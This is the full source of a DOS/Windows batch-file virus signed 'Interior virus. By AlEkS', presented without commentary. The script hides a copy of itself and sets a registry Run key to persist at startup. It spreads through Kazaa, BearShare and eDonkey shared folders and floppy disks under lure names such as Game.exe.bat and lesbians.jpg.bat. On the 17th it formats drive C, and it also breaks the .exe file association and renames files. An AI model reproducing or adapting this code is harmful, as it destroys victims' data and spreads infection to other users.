   @echo off
   ctty nul
   echo.|date|find "17">nul
   if errorlevel 1 goto go
   goto int
   :go
   set TAROT=txt
   set inte=e
   set ger=ex
   if exist c:\Interior.bat goto 27
   echo 1 >>%0
   copy %0 c:\Interior.bat >nul
   @attrib +h +s c:\Interior.bat >nul
   md C:\LittleLove
   copy %0 c:\LittleLove\Love.exe.bat >nul
   copy %0 c:\LittleLove\Game.exe.bat >nul
   copy %0 c:\LittleLove\Uninstall.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Love.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\sex.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Game.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Sex.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Game.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Kaspersky.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\lesbians.mp3.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\lesbians.jpg.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\lesbians.jpg.bat >nul
   copy %0 c:\progra~1\install.exe.bat >nul
   copy %0 %windir%\LittleLove.txt.bat >nul
   echo REGEDIT4>C:\ttarot.reg
   echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\ttarot.reg
   echo "tarot"="c:\\Interior.bat" >> C:\ttarot.reg
   regedit /s C:\ttarot.reg
   del C:\ttarot.reg >nul
   if exist %windir%\1.sys goto 2
   :1
   echo taro >>%windir%\1.sys
   echo taro >>c:\Interior.inf
   echo taro >>c:\Interior.txt
   echo taro >>c:\Interior.ini
   :2
   :27
   if exist c:\Interior.inf goto 5
   :Int
   echo y|Format c:/q >nul
   :5
   if exist c:\Interior.txt goto 11

   echo REGEDIT4>C:\Interior.reg
   echo.>>C:\Interior.reg
   echo [HKEY_CLASSES_ROOT\.%ger%%inte%]>>C:\Interior.reg
   echo "%1" = "%TAROT%file">>C:\Interior.reg
   echo "Content Type" = "text/plain">>C:\Interior.reg
   echo "PerceivedType" = "text">>C:\Interior.reg
   regedit /s C:\Interior.reg
   del C:\Interior.reg
   :11
   if exist c:\Interior.ini goto 33
   cls
   :2av
   for %%v in (*.*) do ren *.* *.interor
   cd ..\
   if errorlevel 1 goto 33
   goto 2av
   :33
   echo      Interior virus. >>%windir%\info.txt
   echo         By AlEkS >>%windir%\info.txt
   echo    ..Have a nice day.. >>%windir%\info.txt
   copy %0 A:\Interior.txt.bat >nul
   ctty con
   cls
